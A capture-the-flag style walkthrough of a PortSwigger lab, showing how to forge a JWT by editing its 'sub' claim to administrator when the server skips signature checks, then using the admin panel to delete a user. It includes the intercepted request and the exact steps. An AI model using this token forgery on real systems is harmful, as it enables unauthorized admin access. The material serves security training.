# JWT authentication bypass via unverified signature

Link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

### solution

- start by logging in using the creds wiener:peter as mentioned in the challange
- when you access /admin endpoint you will get this message `Admin interface only available if logged in as an administrator`
- go to burp suit and intercept this request
```
GET /admin HTTP/2
Host: 0ab0008603711fb780d8493700990063.web-security-academy.net
Cookie: session=eyJraWQiOiJiYTk2OTNhMS1iMmMxLTRmZDItOWQyYS0zZGQzMWJiMzQ2NzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTcwNzM4MjU2M30.rrLdMa1ekPuusLkndICXHtBQhI3jULos4T3EP0cX4vKRKhKcOiGvPxwVZB5VD6IdTJzoeLbe-uW9LxdtJQngDLX4LBNjtvn9NDues1ccVSw9nE7EkvOmubKv1_fuytjZ4xeGG6kQXXgS4rXIl3ARvZwBC0FSRaPqO4rGVhZWhswA7Nd4BBtuuHhvLYfY9HXzuO7f2SNGwb0UL5bttHYpth-5HlTveu5aBedVGwDtx3CV4E7UaSLqqJqinAJDmLnCfV-BuyzNeJvUI4wkGEK9rFL7s7adeipV8o2g0TxmpbdQNouBYRJr4FLPFB5K6ndYDSU7yExz1fzs6f1LmgeOvg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
```
- We see that interesting cookie session which is JWT
- Decode the payload and it will be
`{"iss":"portswigger","sub":"wiener","exp":1707382563}`
- changing `wiener` to `administrator` then encode it again and send the request after the modification
- We accessed `/admin` successfully
- now let's delete carlos by sending the request to `/admin/delete?username=carlos`
- congratzzzzzzzzzzzzzzzz